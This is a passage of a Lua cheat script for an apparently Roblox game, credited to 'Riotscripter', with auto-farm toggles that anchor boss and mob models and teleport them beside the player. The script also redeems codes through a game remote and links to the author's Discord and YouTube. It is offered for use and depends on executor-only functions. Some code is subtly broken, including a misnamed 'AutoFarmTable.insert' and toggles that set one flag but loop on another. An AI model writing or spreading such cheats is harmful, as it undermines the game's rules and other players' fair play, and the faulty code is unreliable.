		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss and game:GetService("RunService").PreRender:Wait() do
				BringBosses()
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 2",
		Default = false,
		Save = true,
		Flag = "autobosses2_db",
		Callback = function(Value)
			getgenv().BringBoss2 = Value
			while BringBoss2 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 3",
		Default = false,
		Save = true,
		Flag = "autobosses3_db",
		Callback = function(Value)
			getgenv().BringBoss3 = Value
			while BringBoss3 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 4",
		Default = false,
		Save = true,
		Flag = "autobosses4_db",
		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss4 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 5",
		Default = false,
		Save = true,
		Flag = "autobosses5_db",
		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss5 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses",
		Default = false,
		Save = true,
		Flag = "automobsbosses_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses = Value
			while getgenv().AutoMobsBosses and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 2",
		Default = false,
		Save = true,
		Flag = "automobsbosses2_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses2 = Value
			while getgenv().AutoMobsBosses2 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 3",
		Default = false,
		Save = true,
		Flag = "automobsbosses3_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses3 = Value
			while getgenv().AutoMobsBosses3 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 4",
		Default = false,
		Save = true,
		Flag = "automobsbosses4_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses4 = Value
			while getgenv().AutoMobsBosses4 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, -3)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 5",
		Default = false,
		Save = true,
		Flag = "automobsbosses5_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses5 = Value
			while getgenv().AutoMobsBosses5 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							table.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
					end
				end
			end
		end
	})

	AutoFarmTab:AddButton({
		Name = "Destroy Gui",
		Callback = function()
			OrionLib:Destroy()
		end
	})

	local CodesTab = Window:MakeTab({
		Name = "Codes!",
		Icon = "rbxassetid://4483345998",
		PremiumOnly = false,
	})

	CodesTab:AddTextbox({
		Name = "Codes (Redeem!)",
		Default = "",
		TextDisappear = false,
		Callback = function(Value)
			local args = {
				[1] = {
					["UniqueTag"] = "RedeemCode",
					["InputText"] = Value,
					["InputType"] = "Text",
					["LeftButton"] = "Redeem",
					["Description"] = "Redeem Code",
					["Prompt"] = "RedeemCode",
					["RightButton"] = "Cancel",
					["Title"] = "Codes"
				},
				[2] = "Redeem"
			}
			game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.4.7").knit.Services.PromptService.RE.Prompt:FireServer(unpack(args))
		end
	})

	local CreditsTab = Window:MakeTab({
		Name = "Credits!",
		Icon = "rbxassetid://4483345998",
		PremiumOnly = false,
	})

	local Section = CreditsTab:AddSection({
		Name = "Credits!",
	})

	CreditsTab:AddLabel("Script is made by Riotscripter")
	CreditsTab:AddLabel("Scripted by Riotscripter!")
	CreditsTab:AddLabel("UI Library by Riotscripter!")
	CreditsTab:AddLabel("Script Discontinued So Let Me Know If Its Patched!")

	CreditsTab:AddParagraph("Info","Tap The Button To Copy My Social And Invite Links!")
	CreditsTab:AddParagraph("Info","Script changelogs at our Discord Server. If you find any bugs, inform us.")

	CreditsTab:AddButton({
		Name = "Discord",
		Callback = function()
			setclipboard("https://discord.gg/9rMZvSPAQv")
			print("Riotscripter: Copied Discord Server Invite to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Discord Server Invite to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddButton({
		Name = "Youtube",
		Callback = function()
			setclipboard("https://m.youtube.com/channel/UCvXEiClhdiICCgSVzkEIT3A")
			print("Riotscripter: Copied Youtube Channel Link to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Youtube Channel Link to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddButton({
		Name = "Github",
		Callback = function()
			setclipboard("https://github.com/Riotscripter")
			print("Riotscripter: Copied Github Channel Link to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Github Channel Link to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddBind({
		Name = "UI Toggle Keybind", 
		Default = Enum.KeyCode.RightShift, 
		Hold = false, 
		Callback = function()
			print("press")
		end    
	})
	OrionLib:Init()
	end
	
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
Frame.BackgroundTransparency = 0.500
Frame.Position = UDim2.new(0.858712733, 0, 0.0237762257, 0)
Frame.Size = UDim2.new(0.129513338, 0, 0.227972031, 0)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Size = UDim2.new(1, 0, 1, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "TOGGLE"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 50.000
TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextStrokeTransparency = 0.000
TextButton.TextWrapped = true

TextButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.RightShift, false, game)
end)

UITextSizeConstraint.Parent = TextButton
UITextSizeConstraint.MaxTextSize = 50

-- PART 1
